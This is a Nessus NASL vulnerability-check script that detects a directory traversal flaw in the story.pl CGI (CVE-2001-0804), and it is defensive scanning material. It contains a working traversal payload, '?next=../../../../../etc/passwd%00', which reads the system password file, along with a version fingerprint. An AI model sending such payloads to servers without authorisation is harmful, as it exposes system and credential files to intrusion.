#
# This script was written by Georges Dagousset <georges.dagousset@alert4web.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10817);
 script_bugtraq_id(3028);
 script_version("$Revision: 1.18 $");
 script_cve_id("CVE-2001-0804");
 name["english"] = "Interactive Story Directory Traversal Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "It is possible to read arbitrary files on
the remote server by requesting :

GET /cgi-bin/story.pl?next=../../../file_to_read%00

An attacker may use this flaw to read arbitrary files on
this server.

Solution: Upgrade story.pl to the latest version (1.4 or later).
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Checks for the presence of /cgi-bin/story.pl";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 Alert4Web.com");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

function check(url)
{
 req = string(url, "?next=../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if(buf == NULL)exit(0);
 if(egrep(pattern:"^HTTP/.* 404 .*", string:buf))return(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
   {
    security_hole(port);
    exit(0);
   }
  
 if ( thorough_tests )
 {
  req = string(url, "?next=about");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  if (egrep(pattern:"This is version 1\.[0-3] of the story program", string:buf))
   {
    security_hole(port:port);
    exit(0);
   }
 }
}

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir ( cgi_dirs() )
{
check(url:string(dir, "/story.pl"));
#check(url:string(dir, "/story/story.pl"));
}
